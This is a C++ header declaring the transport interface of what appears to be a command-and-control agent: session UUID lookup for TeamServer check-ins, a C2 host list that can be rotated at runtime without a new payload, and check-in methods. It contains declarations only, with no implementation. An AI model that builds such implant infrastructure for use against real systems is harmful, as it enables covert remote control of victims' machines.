// ========================================== { START OF FILE } ========================================== //
#pragma once

#include <string>
#include <vector>

namespace agent::transport {

    /// Session identifier the server issued at check-in (the CheckIn UUID). File transfers are
    /// keyed by it: the TeamServer resolves an upload's agent key with GetAgentByCheckInUUID, so
    /// sending the payload UUID instead makes the lookup fail and the upload is dropped.
    /// Empty until the first check-in has completed.
    [[nodiscard]] std::string CurrentSessionUuid();

    /// The C2 hosts the agent will try, first entry first. Seeded from COMM_HOSTS_LIST and
    /// replaceable at runtime by `SET/UPDATE_HOSTS`, so a rotation does not need a new payload.
    [[nodiscard]] std::vector<std::string> Hosts();

    /// Replaces the host list. An empty list is rejected by the command layer, never here.
    void SetHosts(std::vector<std::string> hosts);

    class CommManager {
       public:
        CommManager();
        [[nodiscard]] std::string Checkin(const std::string& json);
        void InitialCheckin(const std::string& json);

       private:
        std::string payload_uuid;
        std::string uuid;
    };

}  // namespace agent::transport
// ========================================== { END OF FILE } ========================================== //
